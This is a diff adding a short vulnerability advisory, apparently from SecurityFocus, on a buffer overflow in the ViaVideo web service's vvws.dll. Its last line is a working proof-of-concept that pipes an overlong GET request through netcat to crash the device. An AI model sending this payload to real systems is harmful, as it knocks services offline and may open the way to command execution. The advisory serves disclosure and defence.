@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/5964/info
+
+A buffer overflow vulnerability has been reported for ViaVideo.
+
+An attacker can exploit this vulnerability by issuing excessively long 'GET' requests to ViaVideo devices. This will cause an error in the 'vvws.dll' library and will cause the ViaVideo service to crash.
+
+Although unconfirmed, it may be possible for a remote attacker to exploit this issue to execute arbitrary system commands with the privileges of the ViaVideo process. 
+
+perl -e 'print "GET " . "A" x 4132 . " HTTP/1.0\r\n\r\n";' | netcat 10.1.0.1 3603 
